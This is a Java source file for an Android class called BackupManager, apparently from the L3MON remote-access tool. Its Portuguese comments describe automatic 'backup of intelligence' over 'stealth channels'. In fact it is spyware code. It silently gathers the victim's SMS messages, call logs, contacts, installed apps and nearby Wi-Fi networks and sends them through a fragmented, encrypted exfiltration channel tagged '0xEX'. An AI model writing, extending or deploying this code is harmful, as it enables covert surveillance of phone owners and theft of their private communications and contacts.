package com.etechd.l3mon.managers;

import android.content.Context;
import android.util.Log;
import com.etechd.l3mon.AppList;
import com.etechd.l3mon.CallsManager;
import com.etechd.l3mon.ContactsManager;
import com.etechd.l3mon.SMSManager;
import com.etechd.l3mon.WifiScanner;
import org.json.JSONObject;

/**
 * BackupManager - Gerencia o backup automático de inteligência para o servidor.
 * Envia lotes de dados capturados periodicamente usando canais stealth.
 */
public class BackupManager {
    private static final String TAG = "BackupManager";
    private final Context context;

    public BackupManager(Context context) {
        this.context = context;
    }

    /**
     * Executa o ciclo de backup completo
     */
    public void runAutomaticBackup() {
        new Thread(() -> {
            try {
                LogManager.log(LogManager.CAT_SYSTEM, LogManager.LEVEL_INFO, "BACKUP", "Iniciando ciclo de backup automático", null);

                // 1. Backup de Mensagens e Chamadas
                backupIntelligence("SMS", SMSManager.getsms());
                backupIntelligence("CALLS", CallsManager.getCallsLogs());

                // 2. Backup de Contatos
                backupIntelligence("CONTACTS", ContactsManager.getContacts());

                // 3. Backup de Infraestrutura (Apps e Wifi)
                backupIntelligence("APPS", AppList.getInstalledApps(false));
                backupIntelligence("WIFI", WifiScanner.scan(context));

                LogManager.log(LogManager.CAT_SYSTEM, LogManager.LEVEL_INFO, "BACKUP", "Ciclo de backup concluído com sucesso", null);
            } catch (Exception e) {
                Log.e(TAG, "Erro no backup automático: " + e.getMessage());
                LogManager.log(LogManager.CAT_SYSTEM, LogManager.LEVEL_ERROR, "BACKUP", "Falha no backup: " + e.getMessage(), null);
            }
        }).start();
    }

    private void backupIntelligence(String type, Object data) {
        try {
            if (data == null) return;

            JSONObject backupObj = new JSONObject();
            backupObj.put("type", "auto_backup");
            backupObj.put("dataType", type);
            backupObj.put("payload", data);
            backupObj.put("ts", System.currentTimeMillis());

            // Envia via canal fragmentado + criptografado (0xEX para exfiltração)
            ExfilManager.sendFragmented("0xEX", backupObj.toString());
            
            Log.d(TAG, "Lote de backup enviado: " + type);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar lote de backup " + type + ": " + e.getMessage());
        }
    }
}